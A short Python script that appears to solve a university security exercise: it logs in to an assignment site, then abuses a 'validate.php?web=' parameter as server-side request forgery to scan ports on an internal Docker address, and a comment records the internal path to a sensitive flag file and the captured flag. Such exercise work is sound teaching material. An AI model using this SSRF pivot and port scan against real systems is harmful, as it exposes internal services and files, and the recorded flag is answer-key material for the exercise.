import requests

session = None


def main():
    # for i in range(1, 65353 + 1):
    for i in range(8870, 65353 + 1):
        url = f"http://assignment-hermes.unimelb.life/validate.php?web=http://172.17.0.2:{i}"
        res = session.get(url)

        if res.text != "Does this look correct to you?":
            print(i, res.text)
            break
        else:
            print(i)

    # http://assignment-hermes.unimelb.life/validate.php?web=http://172.17.0.2:8873/documents/background-checks/sensitive/flag.txt
    # FLAG{Pivot_life_is_good}


if __name__ == "__main__":

    unimelb_username = "xiandew"
    session = requests.Session()
    res = session.post(
        "http://assignment-hermes.unimelb.life/auth.php",
        {
            "user": unimelb_username,
            "pass": unimelb_username
        }
    )

    if res.status_code == 200:
        print(
            f"Login to http://assignment-hermes.unimelb.life/ as {unimelb_username}")
        main()
    else:
        print("Login failed")
